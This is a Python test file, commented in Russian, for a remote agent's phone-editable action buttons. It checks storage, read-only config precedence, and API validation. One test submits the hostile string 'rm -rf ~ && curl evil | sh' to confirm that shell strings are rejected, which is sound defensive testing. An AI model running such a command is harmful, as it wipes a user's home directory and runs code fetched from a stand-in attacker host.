"""Кнопки, заводимые прямо из интерфейса.

Главное, что здесь проверяется, — граница между удобством и оболочкой.
Кнопку можно завести с телефона, но она всё равно остаётся типизированным
описанием: произвольная строка для ``sh`` не проходит ни одним путём.
"""

from __future__ import annotations

from pathlib import Path

import pytest

from remo32_agent.actions.models import DesktopAction, ExecAction, TmuxAction
from remo32_agent.actions.runner import ActionRegistry
from remo32_agent.actions.store import ActionStore
from remo32_core.errors import (
    ActionNotFoundError,
    ActionReadOnlyError,
    ActionsNotEditableError,
    ConfigurationError,
)
from tests.conftest import TEST_TOKEN


@pytest.fixture
def store(tmp_path: Path) -> ActionStore:
    return ActionStore(tmp_path / "actions.toml")


class TestХранилище:
    def test_отсутствующий_файл_это_пустой_список(self, store: ActionStore) -> None:
        # Свежая установка не должна падать из-за того, что кнопок ещё нет.
        assert store.load() == []

    def test_сохранение_и_чтение(self, store: ActionStore) -> None:
        store.save([DesktopAction(id="obs", name="OBS", argv=["obs"], icon="🎥")])
        again = ActionStore(store.path).load()
        assert [a.id for a in again] == ["obs"]
        assert again[0].name == "OBS"

    def test_запись_повторяема(self, store: ActionStore) -> None:
        """Одно и то же состояние обязано давать один и тот же файл.

        Иначе каждое открытие формы порождало бы «изменение» на диске, а
        в системе контроля версий — бесконечный шум.
        """
        actions = [
            TmuxAction(id="a", name="A", session="a", argv=["bash"]),
            ExecAction(id="b", name="B", argv=["/usr/bin/true"]),
        ]
        store.save(actions)
        first = store.path.read_bytes()
        store.save(actions)
        assert store.path.read_bytes() == first

    def test_файл_не_читается_всем_подряд(self, store: ActionStore) -> None:
        # В командах бывают пути и имена сессий; это не секрет, но и не то,
        # что стоит отдавать другим пользователям машины.
        store.save([ExecAction(id="a", name="A", argv=["/usr/bin/true"])])
        assert store.path.stat().st_mode & 0o077 == 0

    def test_правка_файла_руками_подхватывается(self, store: ActionStore) -> None:
        store.save([ExecAction(id="a", name="A", argv=["/usr/bin/true"])])
        assert len(store.load()) == 1

        store.path.write_text(
            '[[actions]]\nid = "b"\nname = "B"\nkind = "exec"\nargv = ["/usr/bin/true"]\n',
            encoding="utf-8",
        )
        # mtime мог совпасть с точностью до секунды — сдвигаем явно.
        stat = store.path.stat()
        import os

        os.utime(store.path, (stat.st_atime, stat.st_mtime + 10))
        assert [a.id for a in store.load()] == ["b"]

    def test_испорченный_файл_объясняет_себя(self, store: ActionStore) -> None:
        store.path.parent.mkdir(parents=True, exist_ok=True)
        store.path.write_text("это не toml [[[", encoding="utf-8")
        with pytest.raises(ConfigurationError, match="actions"):
            store.load()

    def test_дубликаты_не_сохраняются(self, store: ActionStore) -> None:
        with pytest.raises(ConfigurationError, match="дублирующийся"):
            store.save(
                [
                    ExecAction(id="a", name="A", argv=["/usr/bin/true"]),
                    ExecAction(id="a", name="Ещё A", argv=["/usr/bin/false"]),
                ]
            )


class TestРеестр:
    def test_кнопки_из_двух_источников_складываются(self, store: ActionStore) -> None:
        store.save([DesktopAction(id="obs", name="OBS", argv=["obs"])])
        beep = ExecAction(id="beep", name="Гудок", argv=["/usr/bin/true"])
        registry = ActionRegistry([beep], store)
        assert {d.id for d in registry.descriptors()} == {"obs", "beep"}

    def test_редактируемость_видна_снаружи(self, store: ActionStore) -> None:
        store.save([DesktopAction(id="obs", name="OBS", argv=["obs"])])
        beep = ExecAction(id="beep", name="Гудок", argv=["/usr/bin/true"])
        registry = ActionRegistry([beep], store)
        editable = {d.id: d.editable for d in registry.descriptors()}
        assert editable == {"obs": True, "beep": False}

    def test_agent_toml_сильнее_интерфейса(self, store: ActionStore) -> None:
        """Файл, написанный человеком, не подменяется кнопкой с телефона."""
        store.save([DesktopAction(id="beep", name="Подменыш", argv=["obs"])])
        beep = ExecAction(id="beep", name="Гудок", argv=["/usr/bin/true"])
        registry = ActionRegistry([beep], store)

        assert registry.get("beep").name == "Гудок"
        assert [d.id for d in registry.descriptors()] == ["beep"]

    def test_кнопку_из_конфига_нельзя_изменить(self, store: ActionStore) -> None:
        beep = ExecAction(id="beep", name="Гудок", argv=["/usr/bin/true"])
        registry = ActionRegistry([beep], store)
        with pytest.raises(ActionReadOnlyError):
            registry.upsert(ExecAction(id="beep", name="Другое", argv=["/usr/bin/false"]))
        with pytest.raises(ActionReadOnlyError):
            registry.delete("beep")

    def test_без_хранилища_правка_запрещена(self) -> None:
        registry = ActionRegistry([])
        with pytest.raises(ActionsNotEditableError):
            registry.upsert(ExecAction(id="a", name="A", argv=["/usr/bin/true"]))

    def test_удаление_несуществующей(self, store: ActionStore) -> None:
        registry = ActionRegistry([], store)
        with pytest.raises(ActionNotFoundError):
            registry.delete("нет-такой")


class TestApiАгента:
    def test_состояние_редактора(self, agent_client) -> None:  # type: ignore[no-untyped-def]
        body = agent_client.get("/api/action-editor").json()
        assert body["ok"]
        assert body["data"]["enabled"] is True
        assert body["data"]["actions"] == []
        # Интерфейс не должен зашивать список видов у себя.
        assert "tmux" in body["data"]["kinds"]

    def test_создание_и_удаление(self, agent_client) -> None:  # type: ignore[no-untyped-def]
        saved = agent_client.put(
            "/api/action-editor/mpv",
            json={"name": "Проигрыватель", "kind": "desktop", "argv": ["mpv"], "icon": "🎬"},
        )
        assert saved.status_code == 200, saved.text
        assert saved.json()["data"]["editable"] is True

        listed = agent_client.get("/api/actions").json()["data"]
        assert any(a["id"] == "mpv" and a["editable"] for a in listed)

        assert agent_client.delete("/api/action-editor/mpv").json()["data"]["actions"] == []
        assert all(a["id"] != "mpv" for a in agent_client.get("/api/actions").json()["data"])

    def test_идентификатор_берётся_из_адреса(self, agent_client) -> None:  # type: ignore[no-untyped-def]
        """Тело не может переназначить себе чужой идентификатор."""
        agent_client.put(
            "/api/action-editor/mpv",
            json={
                "id": "совсем-другое",
                "name": "Проигрыватель",
                "kind": "desktop",
                "argv": ["mpv"],
            },
        )
        ids = [a["id"] for a in agent_client.get("/api/action-editor").json()["data"]["actions"]]
        assert ids == ["mpv"]

    def test_строка_для_оболочки_не_проходит(self, agent_client) -> None:  # type: ignore[no-untyped-def]
        """Ровно та граница, ради которой всё это устроено сложнее строки."""
        response = agent_client.put(
            "/api/action-editor/danger",
            json={"name": "Зло", "kind": "exec", "argv": "rm -rf ~ && curl evil | sh"},
        )
        assert response.status_code == 400
        assert response.json()["error"]["code"] == "action_invalid"

    def test_неизвестный_вид_отклоняется(self, agent_client) -> None:  # type: ignore[no-untyped-def]
        response = agent_client.put(
            "/api/action-editor/x", json={"name": "X", "kind": "оболочка", "argv": ["sh"]}
        )
        assert response.status_code == 400

    def test_ошибка_называет_поле(self, agent_client) -> None:  # type: ignore[no-untyped-def]
        """Читать вывод pydantic целиком на телефоне невозможно."""
        response = agent_client.put(
            "/api/action-editor/x", json={"name": "", "kind": "exec", "argv": ["/usr/bin/true"]}
        )
        assert response.status_code == 400
        assert "name" in response.json()["error"]["message"]

    def test_кнопку_из_конфига_через_api_не_переписать(self, agent_client) -> None:  # type: ignore[no-untyped-def]
        response = agent_client.put(
            "/api/action-editor/beep",
            json={"name": "Подменыш", "kind": "exec", "argv": ["/usr/bin/false"]},
        )
        assert response.status_code == 409
        assert response.json()["error"]["code"] == "action_read_only"

    def test_предел_на_число_кнопок(self, agent_settings, runner) -> None:  # type: ignore[no-untyped-def]
        from fastapi.testclient import TestClient

        from remo32_agent.app import create_app

        agent_settings.actions_editor.max_actions = 2
        app = create_app(agent_settings, runner=runner, configure_logs=False)
        with TestClient(app) as client:
            client.headers.update({"X-Remo32-Agent-Token": TEST_TOKEN})
            for number in range(2):
                created = client.put(
                    f"/api/action-editor/a{number}",
                    json={"name": f"A{number}", "kind": "exec", "argv": ["/usr/bin/true"]},
                )
                assert created.status_code == 200, created.text
            refused = client.put(
                "/api/action-editor/a3",
                json={"name": "A3", "kind": "exec", "argv": ["/usr/bin/true"]},
            )
            assert refused.status_code == 400
            assert "предел" in refused.json()["error"]["message"]

    def test_выключенный_редактор_закрывает_обе_ручки(self, agent_settings, runner) -> None:  # type: ignore[no-untyped-def]
        from fastapi.testclient import TestClient

        from remo32_agent.app import create_app

        agent_settings.actions_editor.enabled = False
        app = create_app(agent_settings, runner=runner, configure_logs=False)
        with TestClient(app) as client:
            client.headers.update({"X-Remo32-Agent-Token": TEST_TOKEN})
            assert client.get("/api/action-editor").json()["data"]["enabled"] is False
            assert (
                client.put(
                    "/api/action-editor/x",
                    json={"name": "X", "kind": "exec", "argv": ["/usr/bin/true"]},
                ).status_code
                == 403
            )
            assert client.delete("/api/action-editor/x").status_code == 403
